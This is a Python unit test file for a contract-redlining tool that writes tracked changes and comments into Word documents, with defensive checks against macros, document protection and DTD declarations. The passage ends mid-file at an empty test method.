#!/usr/bin/env python3
"""hetong_redline.py 的单元测试。

全部 fixture 由标准库现场生成，仅为虚构文本，不读写任何真实合同或外部验收素材。
"""

import contextlib
import io
import json
import os
import re
import shutil
import tempfile
import unittest
import warnings
import zipfile
from unittest import mock
from xml.sax.saxutils import escape as xml_escape

import hetong_redline as cr

CT_NS = cr.CT_NS
REL_NS = cr.REL_NS
W_NS = cr.W_NS
STRICT_NS = cr.STRICT_W_NS


def esc(text):
    return xml_escape(text)


def r(text, rpr=""):
    return f'<w:r>{rpr}<w:t xml:space="preserve">{esc(text)}</w:t></w:r>'


def p(*runs, ppr=""):
    return "<w:p>{}{}</w:p>".format(ppr, "".join(runs))


def rpr(bold=False, color=None):
    inner = ""
    if bold:
        inner += "<w:b/>"
    if color:
        inner += f'<w:color w:val="{color}"/>'
    return f"<w:rPr>{inner}</w:rPr>"


COMMENTS_PART = (
    '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
    f'<w:comments xmlns:w="{W_NS}">'
    '<w:comment w:id="4" w:author="旧审阅" w:date="2024-01-01T00:00:00Z">'
    "<w:p><w:r><w:t>旧批注内容</w:t></w:r></w:p></w:comment>"
    "</w:comments>"
)


def build_docx_bytes(
    body,
    *,
    ns=W_NS,
    prefix="w",
    extras=None,
    settings=None,
    content_types=None,
    document_rels=None,
):
    extras = dict(extras or {})
    if settings is not None:
        extras["word/settings.xml"] = settings.encode("utf-8")
    has_comments = "word/comments.xml" in extras

    document = (
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
        f'<{prefix}:document xmlns:{prefix}="{ns}" '
        'xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">'
        f"<{prefix}:body>{body}<{prefix}:sectPr/></{prefix}:body></{prefix}:document>"
    ).encode()

    overrides = [
        '<Override PartName="/word/document.xml" ContentType="application/'
        'vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>'
    ]
    if has_comments:
        overrides.append(
            f'<Override PartName="/word/comments.xml" ContentType="{cr.COMMENTS_CT}"/>'
        )
    if settings is not None:
        overrides.append(
            '<Override PartName="/word/settings.xml" ContentType="application/'
            "vnd.openxmlformats-officedocument.wordprocessingml.settings+xml\"/>"
        )
    ct_xml = content_types or (
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
        '<Types xmlns="{}">'
        '<Default Extension="rels" ContentType="application/vnd.openxmlformats-'
        'package.relationships+xml"/>'
        '<Default Extension="xml" ContentType="application/xml"/>'
        "{}</Types>".format(CT_NS, "".join(overrides))
    )
    if content_types is not None:
        ct_xml = content_types

    rel_entries = [
        '<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/'
        'officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/>'
    ]
    root_rels = (
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
        '<Relationships xmlns="{}">{}</Relationships>'.format(REL_NS, "".join(rel_entries))
    )

    doc_rel_entries = [
        '<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/'
        'officeDocument/2006/relationships/styles" Target="styles.xml"/>'
    ]
    if has_comments:
        doc_rel_entries.append(
            f'<Relationship Id="rId2" Type="{cr.COMMENTS_REL}" Target="comments.xml"/>'
        )
    if document_rels is not None:
        document_rels_xml = document_rels
    else:
        document_rels_xml = (
            '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
            '<Relationships xmlns="{}">{}</Relationships>'.format(REL_NS, "".join(doc_rel_entries))
        )

    parts = {
        "[Content_Types].xml": ct_xml.encode("utf-8"),
        "_rels/.rels": root_rels.encode("utf-8"),
        "word/document.xml": document,
        "word/_rels/document.xml.rels": document_rels_xml.encode("utf-8"),
        "word/styles.xml": (
            '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
            f'<w:styles xmlns:w="{W_NS}"><w:style w:type="paragraph" w:styleId="Normal">'
            '<w:name w:val="Normal"/></w:style></w:styles>'
        ).encode(),
    }
    for name, data in extras.items():
        parts[name] = data.encode("utf-8") if isinstance(data, str) else data
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        for name, data in parts.items():
            zf.writestr(name, data)
    return buf.getvalue()


def build_default_ns_docx(body, ns=W_NS):
    """默认命名空间（根元素无前缀）的包；用于 Strict 命名空间遮蔽回归。"""
    document = (
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
        f'<document xmlns="{ns}"><body>{body}<sectPr/></body></document>'
    ).encode()
    ct_xml = (
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
        f'<Types xmlns="{CT_NS}">'
        '<Default Extension="rels" ContentType="application/vnd.openxmlformats-'
        'package.relationships+xml"/>'
        '<Default Extension="xml" ContentType="application/xml"/>'
        '<Override PartName="/word/document.xml" ContentType="application/'
        'vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>'
        "</Types>"
    ).encode()
    root_rels = (
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
        f'<Relationships xmlns="{REL_NS}">'
        '<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/'
        'officeDocument/2006/relationships/officeDocument" '
        'Target="word/document.xml"/></Relationships>'
    ).encode()
    doc_rels = (
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
        f'<Relationships xmlns="{REL_NS}">'
        '<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/'
        'officeDocument/2006/relationships/styles" Target="styles.xml"/>'
        "</Relationships>"
    ).encode()
    parts = {
        "[Content_Types].xml": ct_xml,
        "_rels/.rels": root_rels,
        "word/document.xml": document,
        "word/_rels/document.xml.rels": doc_rels,
        "word/styles.xml": (
            '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
            f'<styles xmlns="{ns}"/>'
        ).encode(),
    }
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        for name, data in parts.items():
            zf.writestr(name, data)
    return buf.getvalue()


class Base(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.mkdtemp(prefix="hetong-redline-test-")

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    def path(self, name):
        return os.path.join(self.tmp, name)

    def write(self, name, body, **kwargs):
        path = self.path(name)
        with open(path, "wb") as fh:
            fh.write(build_docx_bytes(body, **kwargs))
        return path

    def write_raw(self, name, data):
        path = self.path(name)
        with open(path, "wb") as fh:
            fh.write(data)
        return path

    def cli(self, *argv):
        out, err = io.StringIO(), io.StringIO()
        with contextlib.redirect_stdout(out), contextlib.redirect_stderr(err):
            try:
                code = cr.main(list(argv))
            except SystemExit as exc:  # argparse
                code = exc.code
        return code, out.getvalue(), err.getvalue()

    def json_cli(self, *argv):
        code, out, err = self.cli(*argv)
        try:
            payload = json.loads(out)
        except json.JSONDecodeError:
            self.fail(f"CLI 输出不是 JSON（code={code}）：{out} / {err}")
        return code, payload

    def write_edits(self, edits, name="edits.json"):
        path = self.path(name)
        with open(path, "w", encoding="utf-8") as fh:
            json.dump(edits, fh, ensure_ascii=False)
        return path

    def plan(self, docx, edits, out="plan.json"):
        edits_path = self.write_edits(edits)
        code, payload = self.json_cli("plan", docx, edits_path, "-o", self.path(out))
        if code == 0:
            with open(self.path(out), encoding="utf-8") as fh:
                payload = json.load(fh)
        return code, payload, self.path(out)

    def apply(self, docx, plan="plan.json", out="result.docx", author="合同审阅"):
        return self.json_cli(
            "apply", docx, self.path(plan), "-o", self.path(out), "--author", author
        )

    def verify(self, docx, result="result.docx", plan="plan.json"):
        return self.json_cli(
            "verify", docx, self.path(result), self.path(plan)
        )

    def read_docx_part(self, path, name="word/document.xml"):
        with zipfile.ZipFile(path) as zf:
            return zf.read(name)

    def local_count(self, data, name):
        doc = cr.parse_xml(data, "doc")
        return sum(
            1
            for el in cr.iter_elements_in_order(doc.documentElement)
            if cr.local_name(el) == name
        )


def simple_body(*paragraphs):
    return "".join(paragraphs)


class TestInspect(Base):
    def test_ids_accept_view_and_revisions(self):
        body = simple_body(
            p(r("第一段正文。")),
            p('<w:ins w:id="2" w:author="旧" w:date="2024-01-01T00:00:00Z">'
              + r("新增可见") + "</w:ins>"),
            p(r("前缀") + '<w:del w:id="3" w:author="旧" '
              'w:date="2024-01-01T00:00:00Z"><w:r><w:delText>删除不可见'
              "</w:delText></w:r></w:del>" + r("后缀")),
        )
        docx = self.write("in.docx", body)
        code, report = self.json_cli("inspect", docx)
        self.assertEqual(code, 0, report)
        ids = [x["id"] for x in report["paragraphs"]]
        self.assertEqual(ids, ["RL0001", "RL0002", "RL0003"])
        self.assertEqual(report["paragraphs"][1]["text"], "新增可见")
        self.assertEqual(report["paragraphs"][2]["text"], "前缀后缀")
        self.assertTrue(report["paragraphs"][0]["editable"])
        self.assertFalse(report["paragraphs"][1]["editable"])
        self.assertFalse(report["paragraphs"][2]["editable"])
        self.assertEqual(report["existing_revisions"]["count"], 2)

    def test_table_location(self):
        body = (
            '<w:tbl><w:tblPr/><w:tblGrid/><w:tr><w:tc><w:tcPr/>'
            + p(r("表格内金额100元。"))
            + "</w:tc></w:tr></w:tbl>" + p(r("正文。"))
        )
        docx = self.write("table.docx", body)
        code, report = self.json_cli("inspect", docx)
        self.assertEqual(code, 0)
        self.assertEqual(report["paragraphs"][0]["location"], "table")
        self.assertEqual(report["paragraphs"][1]["location"], "body")

    def test_drawingml_paragraph_not_numbered(self):
        body = (
            p(r("正文段落。"))
            + '<a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">'
            "<a:r><a:t>绘图文本</a:t></a:r></a:p>"
        )
        docx = self.write("drawingml.docx", body)
        code, report = self.json_cli("inspect", docx)
        self.assertEqual(code, 0, report)
        self.assertEqual([x["id"] for x in report["paragraphs"]], ["RL0001"])
        self.assertEqual(report["paragraphs"][0]["text"], "正文段落。")


class TestApplyReplace(Base):
    def test_replacement_across_styled_runs(self):
        body = p(
            r("合同金额为", rpr(bold=True)),
            r("100000", rpr(color="FF0000")),
            r("元。"),
        ) + p(r("其他条款不变。"))
        docx = self.write("styled.docx", body)
        before = cr.sha256_file(docx)
        code, plan, plan_path = self.plan(
            docx,
            [
                {
                    "id": "R1",
                    "para": "RL0001",
                    "old": "100000",
                    "new": "200000",
                    "reason": "调整合同金额",
                }
            ],
        )
        self.assertEqual(code, 0, plan)
        self.assertTrue(os.path.exists(plan_path))
        self.assertEqual(plan["ops"][0]["diff"][0]["old"], "100000")
        self.assertEqual(plan["ops"][0]["diff"][0]["new"], "200000")

        code, result = self.apply(docx)
        self.assertEqual(code, 0, result)
        self.assertTrue(os.path.exists(self.path("result.docx")))
        self.assertEqual(cr.sha256_file(docx), before, "原件必须保持不变")

        xml = self.read_docx_part(self.path("result.docx"))
        self.assertIn(b"<w:ins", xml)
        self.assertIn(b"<w:del", xml)
        self.assertIn(b"200000", xml)
        self.assertIn(b"<w:delText", xml)
        # 删除与插入都继承被替换起点 run 的红色样式
        self.assertIn(b'w:color w:val="FF0000"', xml)
        self.assertNotIn(b"w:color w:val=\"FF0000\"></w:color>", xml)

        code, report = self.verify(docx)
        self.assertEqual(code, 0, report)
        self.assertTrue(all(report["checks"].values()), report["checks"])
        self.assertEqual(report["new_revisions"]["deletions"], 1)
        self.assertEqual(report["new_revisions"]["insertions"], 1)
        self.assertEqual(report["new_comments"]["count"], 1)
        self.assertEqual(report["author"], "合同审阅")

    def test_number_token_is_not_split(self):
        docx = self.write("num.docx", p(r("人民币100000元。")))
        code, plan, _ = self.plan(
            docx,
            [{"id": "R1", "para": "RL0001", "old": "100000",
              "new": "100001", "reason": "更正金额"}],
        )
        self.assertEqual(code, 0)
        op = plan["ops"][0]
        self.assertEqual(len(op["diff"]), 1)
        self.assertEqual(op["diff"][0]["old"], "100000")
        self.assertEqual(op["diff"][0]["new"], "100001")
        self.assertEqual(op["granularity"]["fragment_count"], 1)

    def test_short_gap_changes_are_merged(self):
        docx = self.write("merge.docx", p(r("甲乙丙。")))
        code, plan, _ = self.plan(
            docx,
            [{"id": "R1", "para": "RL0001", "old": "甲乙丙",
              "new": "丁乙戊", "reason": "改写"}],
        )
        self.assertEqual(code, 0)
        op = plan["ops"][0]
        self.assertEqual(op["granularity"]["fragment_count"], 1, op["diff"])
        self.assertEqual(op["diff"][0]["old"], "甲乙丙")
        self.assertEqual(op["diff"][0]["new"], "丁乙戊")

    def test_table_cell_replacement(self):
        body = (
            '<w:tbl><w:tblPr/><w:tblGrid/><w:tr><w:tc><w:tcPr/>'
            + p(r("单价为50元。"))
            + "</w:tc></w:tr></w:tbl>"
        )
        docx = self.write("table_edit.docx", body)
        code, plan, _ = self.plan(
            docx,
            [{"id": "R1", "para": "RL0001", "old": "50", "new": "80",
              "reason": "调价"}],
        )
        self.assertEqual(code, 0, plan)
        code, result = self.apply(docx)
        self.assertEqual(code, 0, result)
        code, report = self.verify(docx)
        self.assertEqual(code, 0, report)

    def test_comment_only_makes_no_revision(self):
        docx = self.write("comment.docx", p(r("付款期限为三十日。")))
        code, plan, _ = self.plan(
            docx,
            [{"id": "C1", "para": "RL0001", "old": "三十日",
              "comment": "请确认是否改为六十日"}],
        )
        self.assertEqual(code, 0, plan)
        self.assertEqual(plan["ops"][0]["kind"], "comment")
        code, result = self.apply(docx)
        self.assertEqual(code, 0, result)
        xml = self.read_docx_part(self.path("result.docx"))
        self.assertNotIn(b"<w:ins", xml)
        self.assertNotIn(b"<w:del", xml)
        self.assertIn(b"commentRangeStart", xml)
        self.assertIn(b"commentReference", xml)
        code, report = self.verify(docx)
        self.assertEqual(code, 0, report)
        self.assertEqual(report["new_revisions"]["insertions"], 0)
        self.assertEqual(report["new_revisions"]["deletions"], 0)
        self.assertEqual(report["new_comments"]["count"], 1)


class TestPlanRejections(Base):
    def test_duplicate_old_rejected(self):
        docx = self.write("dup.docx", p(r("重复内容，重复内容。")))
        code, payload, plan_path = self.plan(
            docx,
            [{"id": "R1", "para": "RL0001", "old": "重复内容",
              "new": "新内容", "reason": "x"}],
        )
        self.assertEqual(code, 1, payload)
        self.assertFalse(os.path.exists(plan_path))

    def test_empty_old_and_noop_rejected(self):
        docx = self.write("empty.docx", p(r("正文内容。")))
        for edit in (
            {"id": "R1", "para": "RL0001", "old": "", "new": "x", "reason": "x"},
            {"id": "R2", "para": "RL0001", "old": "正文", "new": "正文",
             "reason": "x"},
        ):
            code, payload, plan_path = self.plan(docx, [edit], out="p.json")
            self.assertEqual(code, 1, payload)
            self.assertFalse(os.path.exists(plan_path))

    def test_same_paragraph_twice_rejected(self):
        docx = self.write("twice.docx", p(r("甲乙丙丁。")))
        code, payload, plan_path = self.plan(
            docx,
            [
                {"id": "R1", "para": "RL0001", "old": "甲", "new": "A",
                 "reason": "x"},
                {"id": "R2", "para": "RL0001", "old": "丁", "new": "D",
                 "reason": "y"},
            ],
        )
        self.assertEqual(code, 1, payload)
        self.assertFalse(os.path.exists(plan_path))

    def test_complex_target_fails_closed(self):
        body = p(r("正常段落。")) + p(
            r("前缀"), '<w:bookmarkStart w:id="0" w:name="b"/>',
            r("金额100元。"),
        )
        docx = self.write("complex.docx", body)
        code, payload, plan_path = self.plan(
            docx,
            [{"id": "R1", "para": "RL0002", "old": "100", "new": "200",
              "reason": "x"}],
        )
        self.assertEqual(code, 1, payload)
        self.assertIn("不可编辑", payload["error"])
        self.assertFalse(os.path.exists(plan_path))

    def test_batch_failure_has_no_artifact(self):
        body = p(r("正常段落。")) + p(
            r("前缀"), '<w:hyperlink w:anchor="x">' + r("链接100元。")
            + "</w:hyperlink>"
        )
        docx = self.write("batch.docx", body)
        code, payload, plan_path = self.plan(
            docx,
            [
                {"id": "R1", "para": "RL0001", "old": "正常", "new": "普通",
                 "reason": "x"},
                {"id": "R2", "para": "RL0002", "old": "100", "new": "200",
                 "reason": "y"},
            ],
        )
        self.assertEqual(code, 1, payload)
        self.assertFalse(os.path.exists(plan_path))

    def test_large_change_requires_broad_reason(self):
        old_text = "甲" * 70
        new_text = "乙" * 70
        docx = self.write("large.docx", p(r(old_text)))
        code, payload, plan_path = self.plan(
            docx,
            [{"id": "R1", "para": "RL0001", "old": old_text,
              "new": new_text, "reason": "重写"}],
        )
        self.assertEqual(code, 1, payload)
        self.assertIn("broad_reason", payload["error"])
        self.assertFalse(os.path.exists(plan_path))

        code, payload, plan_path = self.plan(
            docx,
            [{"id": "R1", "para": "RL0001", "old": old_text,
              "new": new_text, "reason": "重写",
              "broad_reason": "经用户确认整段重写"}],
            out="plan2.json",
        )
        self.assertEqual(code, 0, payload)
        self.assertTrue(
            payload["ops"][0]["granularity"]["requires_broad_reason"]
        )

    def test_empty_new_is_deletion_not_noop(self):
        docx = self.write("delete.docx", p(r("甲方应支付违约金。")))
        code, plan, _ = self.plan(
            docx,
            [{"id": "R1", "para": "RL0001", "old": "违约金", "new": "",
              "reason": "删除违约金"}],
        )
        self.assertEqual(code, 0, plan)
        self.assertEqual(plan["ops"][0]["target_text"], "甲方应支付。")
        code, payload = self.apply(docx, out="out.docx")
        self.assertEqual(code, 0, payload)
        xml = self.read_docx_part(self.path("out.docx"))
        self.assertIn(b"<w:del", xml)
        self.assertNotIn(b"<w:ins", xml)
        self.assertIn("违约金".encode(), xml)
        code, report = self.verify(docx, result="out.docx")
        self.assertEqual(code, 0, report)
        self.assertEqual(report["new_revisions"]["deletions"], 1)

    def test_existing_revision_in_target_rejected(self):
        body = p(
            r("前缀"),
            '<w:ins w:id="7" w:author="旧" '
            'w:date="2024-01-01T00:00:00Z">' + r("插入") + "</w:ins>",
            r("金额100元。"),
        )
        docx = self.write("targetrev.docx", body)
        code, payload, plan_path = self.plan(
            docx,
            [{"id": "R1", "para": "RL0001", "old": "100", "new": "200",
              "reason": "x"}],
        )
        self.assertEqual(code, 1, payload)
        self.assertIn("不可编辑", payload["error"])
        self.assertFalse(os.path.exists(plan_path))

    def test_existing_comment_anchor_in_target_rejected(self):
        body = p(
            '<w:commentRangeStart w:id="4"/>', r("金额100元。"),
            '<w:commentRangeEnd w:id="4"/>',
            '<w:r><w:rPr><w:rStyle w:val="CommentReference"/></w:rPr>'
            '<w:commentReference w:id="4"/></w:r>',
        )
        docx = self.write(
            "targetcomment.docx", body,
            extras={"word/comments.xml": COMMENTS_PART},
        )
        code, payload, plan_path = self.plan(
            docx,
            [{"id": "R1", "para": "RL0001", "old": "100", "new": "200",
              "reason": "x"}],
        )
        self.assertEqual(code, 1, payload)
        self.assertIn("不可编辑", payload["error"])
        self.assertFalse(os.path.exists(plan_path))

    def test_overlapping_old_occurrences_rejected(self):
        docx = self.write("overlap.docx", p(r("aaaa")))
        code, payload, plan_path = self.plan(
            docx,
            [{"id": "R1", "para": "RL0001", "old": "aa", "new": "b",
              "reason": "x"}],
        )
        self.assertEqual(code, 1, payload)
        self.assertIn("唯一", payload["error"])
        self.assertFalse(os.path.exists(plan_path))

    def test_cross_paragraph_old_rejected(self):
        docx = self.write("cross.docx", p(r("甲乙。")) + p(r("丙丁。")))
        code, payload, plan_path = self.plan(
            docx,
            [{"id": "R1", "para": "RL0001", "old": "乙。丙", "new": "X",
              "reason": "x"}],
        )
        self.assertEqual(code, 1, payload)
        self.assertIn("跨段", payload["error"])
        self.assertFalse(os.path.exists(plan_path))

    def test_empty_run_inside_deleted_span_preserved(self):
        body = p(
            r("甲", rpr(bold=True)),
            '<w:r><w:rPr><w:i/></w:rPr></w:r>',
            r("乙"),
        )
        docx = self.write("emptydelete.docx", body)
        code, plan, _ = self.plan(
            docx,
            [{"id": "R1", "para": "RL0001", "old": "甲乙", "new": "丙",
              "reason": "合并"}],
        )
        self.assertEqual(code, 0, plan)
        code, payload = self.apply(docx, out="out.docx")
        self.assertEqual(code, 0, payload)
        xml = self.read_docx_part(self.path("out.docx"))
        self.assertIn(b"<w:i/>", xml)
        code, report = self.verify(docx, result="out.docx")
        self.assertEqual(code, 0, report)
        self.assertTrue(report["checks"]["reject_equals_baseline"])


class TestPlanIntegrity(Base):
    def setUp(self):
        super().setUp()
        self.docx = self.write("base.docx", p(r("金额为100元。")))
        code, payload, _ = self.plan(
            self.docx,
            [{"id": "R1", "para": "RL0001", "old": "100", "new": "200",
              "reason": "调整"}],
        )
        self.assertEqual(code, 0, payload)

    def test_stale_source_rejected(self):
        # 覆盖原件内容（模拟源文件变化），hash 必须失配
        with open(self.docx, "wb") as fh:
            fh.write(build_docx_bytes(p(r("金额为300元。"))))
        code, payload = self.apply(self.docx, out="out.docx")
        self.assertEqual(code, 1, payload)
        self.assertIn("过期", payload["error"])
        self.assertFalse(os.path.exists(self.path("out.docx")))

    def test_tampered_ops_rejected(self):
        with open(self.path("plan.json"), encoding="utf-8") as fh:
            plan = json.load(fh)
        plan["ops"][0]["new"] = "999"
        with open(self.path("plan.json"), "w", encoding="utf-8") as fh:
            json.dump(plan, fh, ensure_ascii=False)
        code, payload = self.apply(self.docx, out="out.docx")
        self.assertEqual(code, 1, payload)
        self.assertFalse(os.path.exists(self.path("out.docx")))

    def test_tampered_fingerprint_rejected(self):
        with open(self.path("plan.json"), encoding="utf-8") as fh:
            plan = json.load(fh)
        plan["fingerprint"]["value"] = "0" * 64
        with open(self.path("plan.json"), "w", encoding="utf-8") as fh:
            json.dump(plan, fh, ensure_ascii=False)
        code, payload = self.apply(self.docx, out="out.docx")
        self.assertEqual(code, 1, payload)
        self.assertFalse(os.path.exists(self.path("out.docx")))

    def test_refuses_to_overwrite(self):
        code, payload = self.apply(self.docx, out="out.docx")
        self.assertEqual(code, 0, payload)
        code, payload = self.apply(self.docx, out="out.docx")
        self.assertEqual(code, 1, payload)
        code, payload, _ = self.plan(
            self.docx,
            [{"id": "R2", "para": "RL0001", "old": "200", "new": "300",
              "reason": "再次"}],
            out="result.docx",
        )
        self.assertEqual(code, 1, payload)

    def test_in_place_and_plan_over_input_rejected(self):
        code, payload = self.json_cli(
            "apply", self.docx, self.path("plan.json"), "-o", self.docx
        )
        self.assertEqual(code, 1, payload)
        code, payload = self.json_cli(
            "plan", self.docx, self.path("edits.json"), "-o", self.docx
        )
        self.assertEqual(code, 1, payload)

    def test_verify_detects_tampered_result_member(self):
        code, payload = self.apply(self.docx, out="out.docx")
        self.assertEqual(code, 0, payload)
        # 改动未允许变更的成员（_rels/.rels）
        with zipfile.ZipFile(self.path("out.docx")) as zin:
            infos = zin.infolist()
            data = {i.filename: zin.read(i) for i in infos}
        data["_rels/.rels"] = data["_rels/.rels"] + b"\n"
        with zipfile.ZipFile(self.path("tampered.docx"), "w") as zout:
            for info in infos:
                zout.writestr(info, data[info.filename])
        code, payload = self.verify(
            self.docx, result="tampered.docx", plan="plan.json"
        )
        self.assertEqual(code, 3, payload)
        self.assertFalse(payload["detail"]["report"]["checks"]["zip_members_preserved"])

    def test_no_partial_output_when_verification_fails(self):
        fake = {"ok": False, "errors": ["forced"], "checks": {}}
        with mock.patch.object(cr, "verify_core", return_value=fake):
            code, payload = self.apply(self.docx, out="never.docx")
        self.assertEqual(code, 3, payload)
        self.assertFalse(os.path.exists(self.path("never.docx")))


class TestExistingContent(Base):
    def test_existing_revision_and_comment_preserved_and_ids_advance(self):
        body = (
            p(
                r("前"),
                '<w:ins w:id="7" w:author="旧审阅" '
                'w:date="2024-01-01T00:00:00Z">' + r("原有插入") + "</w:ins>",
            )
            + p(
                '<w:commentRangeStart w:id="4"/>',
                r("保留批注锚"),
                '<w:commentRangeEnd w:id="4"/>',
                '<w:r><w:rPr><w:rStyle w:val="CommentReference"/></w:rPr>'
                '<w:commentReference w:id="4"/></w:r>',
            )
            + p(r("金额为100元。"))
        )
        docx = self.write(
            "existing.docx", body, extras={"word/comments.xml": COMMENTS_PART}
        )
        code, plan, _ = self.plan(
            docx,
            [{"id": "R1", "para": "RL0003", "old": "100", "new": "200",
              "reason": "调整"}],
        )
        self.assertEqual(code, 0, plan)
        code, payload = self.apply(docx, out="out.docx")
        self.assertEqual(code, 0, payload)
        # 既有修订 7 → 新修订 8；既有批注 4 → 新批注 5
        # 删除 8、插入 9 各自独立 ID；批注 5
        self.assertEqual(payload["new_revisions"], [8, 9])
        self.assertEqual(payload["new_comments"], [5])

        xml = self.read_docx_part(self.path("out.docx"))
        self.assertIn(b'w:id="7"', xml)
        self.assertIn(b'w:id="8"', xml)
        comments = self.read_docx_part(self.path("out.docx"), "word/comments.xml")
        self.assertIn("旧批注内容".encode(), comments)
        self.assertIn(b'w:id="5"', comments)

        code, report = self.verify(docx, result="out.docx")
        self.assertEqual(code, 0, report)
        self.assertTrue(report["checks"]["existing_comments_preserved"])
        self.assertTrue(report["checks"]["original_revisions_untouched"])
        self.assertEqual(report["new_revisions"]["ids"], ["8", "9"])


class TestProtectionAndSafety(Base):
    def test_modern_comments_extension_rejected(self):
        docx = self.write(
            "modern.docx",
            p(r("正文100元。")),
            extras={
                "word/commentsExtended.xml": (
                    '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
                    '<w15:commentsEx xmlns:w15="http://schemas.microsoft.com/'
                    'office/word/2012/wordml"/>'
                )
            },
        )
        code, report = self.json_cli("inspect", docx)
        self.assertEqual(code, 0)
        self.assertFalse(report["package"]["safe_for_apply"])
        self.assertIn(
            "word/commentsExtended.xml", report["existing_comments"]["modern_extensions"]
        )
        code, payload, plan_path = self.plan(
            docx,
            [{"id": "R1", "para": "RL0001", "old": "100", "new": "200",
              "reason": "x"}],
        )
        self.assertEqual(code, 2, payload)
        self.assertFalse(os.path.exists(plan_path))

    def test_document_protection_fails_closed(self):
        settings = (
            '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
            f'<w:settings xmlns:w="{W_NS}"><w:documentProtection '
            'w:edit="readOnly" w:enforcement="1"/></w:settings>'
        )
        docx = self.write("protected.docx", p(r("正文100元。")), settings=settings)
        code, report = self.json_cli("inspect", docx)
        self.assertEqual(code, 0)
        self.assertFalse(report["package"]["safe_for_apply"])
        code, payload, _ = self.plan(
            docx,
            [{"id": "R1", "para": "RL0001", "old": "100", "new": "200",
              "reason": "x"}],
        )
        self.assertEqual(code, 2, payload)

    def test_write_protection_fails_closed(self):
        settings = (
            '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
            f'<w:settings xmlns:w="{W_NS}"><w:writeProtection '
            'w:recommended="1"/></w:settings>'
        )
        docx = self.write("writeprot.docx", p(r("正文。")), settings=settings)
        code, payload, _ = self.plan(
            docx,
            [{"id": "R1", "para": "RL0001", "old": "正文", "new": "新正文",
              "reason": "x"}],
        )
        self.assertEqual(code, 2, payload)
        self.assertIn("writeProtection", payload["error"])

    def test_macro_and_signature_parts_rejected(self):
        for name, extra in (
            ("word/vbaProject.bin", {"word/vbaProject.bin": b"PK\x03\x04fake"}),
            ("_xmlsignatures/sig1.xml", {"_xmlsignatures/sig1.xml": "<sig/>"}),
        ):
            docx = self.write(
                f"unsafe-{len(name)}.docx", p(r("正文。")), extras=extra
            )
            code, payload, plan_path = self.plan(
                docx,
                [{"id": "R1", "para": "RL0001", "old": "正文", "new": "新正文",
                  "reason": "x"}],
            )
            self.assertEqual(code, 2, payload)
            self.assertFalse(os.path.exists(plan_path))

    def test_macro_content_type_rejected(self):
        ct = (
            '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
            f'<Types xmlns="{CT_NS}">'
            '<Default Extension="rels" ContentType="application/vnd.openxmlformats-'
            'package.relationships+xml"/>'
            '<Default Extension="xml" ContentType="application/xml"/>'
            '<Override PartName="/word/document.xml" ContentType="application/'
            'vnd.ms-word.document.macroEnabled.main+xml"/>'
            "</Types>"
        )
        docx = self.write("macroct.docx", p(r("正文。")), content_types=ct)
        code, payload, _ = self.plan(
            docx,
            [{"id": "R1", "para": "RL0001", "old": "正文", "new": "新正文",
              "reason": "x"}],
        )
        self.assertEqual(code, 2, payload)
        self.assertIn("宏", payload["error"])

    def test_strict_ooxml_rejected(self):
        docx = self.write("strict.docx", p(r("正文。")), ns=STRICT_NS)
        code, report = self.json_cli("inspect", docx)
        self.assertEqual(code, 0)
        self.assertFalse(report["package"]["safe_for_apply"])
        self.assertIn("Strict OOXML", " ".join(report["package"]["blockers"]))
        code, payload, _ = self.plan(
            docx,
            [{"id": "R1", "para": "RL0001", "old": "正文", "new": "新正文",
              "reason": "x"}],
        )
        self.assertEqual(code, 2, payload)

    def test_doctype_and_entity_rejected_before_parse(self):
        for prolog in (
            '<!DOCTYPE w:document [<!ELEMENT x ANY>]>',
            '<!ENTITY boom "x">',
        ):
            document = (
                '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
                + prolog
                + f'<w:document xmlns:w="{W_NS}"><w:body><w:p><w:r><w:t>正文'
                "</w:t></w:r></w:p></w:body></w:document>"
            )
            path = self.path("dtd.docx")
            buf = io.BytesIO()
            with zipfile.ZipFile(buf, "w") as zf:
                zf.writestr("[Content_Types].xml", (
                    f'<?xml version="1.0"?><Types xmlns="{CT_NS}">'
                    '<Default Extension="xml" ContentType="application/xml"/>'
                    '<Override PartName="/word/document.xml" ContentType="application/'
                    'vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>'
                    "</Types>"))
                zf.writestr("_rels/.rels", (
                    f'<?xml version="1.0"?><Relationships xmlns="{REL_NS}">'
                    '<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/'
                    'officeDocument/2006/relationships/officeDocument" '
                    'Target="word/document.xml"/></Relationships>'))
                zf.writestr("word/document.xml", document)
                zf.writestr("word/_rels/document.xml.rels", (
                    f'<?xml version="1.0"?><Relationships xmlns="{REL_NS}"/>'))
            self.write_raw("dtd.docx", buf.getvalue())
            code, payload = self.json_cli("inspect", path)
            self.assertEqual(code, 2, payload)
            self.assertRegex(payload["error"], "DOCTYPE|ENTITY")

    def test_duplicate_zip_member_rejected(self):
